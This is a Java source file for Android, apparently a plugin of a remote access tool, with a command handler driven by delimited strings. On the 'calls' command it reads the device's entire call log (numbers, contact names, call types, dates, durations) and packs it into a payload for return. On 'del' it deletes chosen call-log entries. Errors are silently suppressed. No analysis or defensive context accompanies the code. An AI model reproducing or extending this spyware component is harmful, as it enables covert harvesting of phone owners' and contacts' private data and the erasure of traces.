package plugens.angel.plugens;
import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import java.io.UnsupportedEncodingException;
import java.util.Date;
public class calls {
    private static String SPL_DATA = "x0D0x";
    private static String SPL_ARRAY = "x0A0x";
    private static String SPL_LINE = "x0L0x";
    private static String OBJ = "<Object>";
    public Object method(Context c, String s, byte[] b) throws UnsupportedEncodingException {
        byte[] f = "null".getBytes();
        String[] d = s.split(SPL_DATA);
        switch(d[0]){
            case "calls":
                try {
                    StringBuffer sb = new StringBuffer();
                    String strOrder = CallLog.Calls.DATE + " DESC";
                    Cursor managedCursor = c.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, strOrder);
                    int GetName = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
                    int GetNumber = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
                    int GetType = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
                    int GetDate = managedCursor.getColumnIndex(CallLog.Calls.DATE);
                    int GetDuration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
                    int idd =managedCursor.getColumnIndex(CallLog.Calls._ID);

                    while (managedCursor.moveToNext()) {
                        String name = managedCursor.getString(GetName);
                        String Number = managedCursor.getString(GetNumber);
                        String Type = managedCursor.getString(GetType);
                        String Date = managedCursor.getString(GetDate);
                        String Duration = managedCursor.getString(GetDuration);
                        String id = managedCursor.getString(idd);
                        java.util.Date callDate = new Date(Long.valueOf(Date));
                        String callType = null;
                        int cas = Integer.parseInt(Type);
                        switch (cas) {
                            case CallLog.Calls.OUTGOING_TYPE:
                                callType = "Outgoing";
                                break;
                            case CallLog.Calls.MISSED_TYPE:
                                callType = "Missed";
                                break;
                            case CallLog.Calls.INCOMING_TYPE:
                                callType = "Incoming";
                                break;
                        }
                      sb.append(Number + SPL_ARRAY + name + SPL_ARRAY + callType + SPL_ARRAY + callDate + SPL_ARRAY + Duration + SPL_ARRAY + id +  SPL_LINE);

                    }
                    managedCursor.close();
                    String s0 = OBJ + SPL_DATA + sb.toString() ;
                    f =  s0.getBytes();
                    return f;
                } catch (Exception e) {}
                break;
            case "del":
                del(c,d[1]);
                break;
        }
        return f;
    }
    private void del(Context ctx , String id) {
            try {
                String ary[] = {id};
                Cursor c = ctx.getContentResolver().query(
                        CallLog.Calls.CONTENT_URI, null,
                        CallLog.Calls._ID + " = ? ", ary, CallLog.Calls.DATE + " DESC");
                if (c.moveToNext()) {
                    int getID = c.getInt(c.getColumnIndex(CallLog.Calls._ID));
                    ctx.getContentResolver().delete(
                            CallLog.Calls.CONTENT_URI,
                            CallLog.Calls._ID + " = ? ",
                            new String[]{String.valueOf(getID)});
                }
            } catch (Exception ex) {}
    }



}
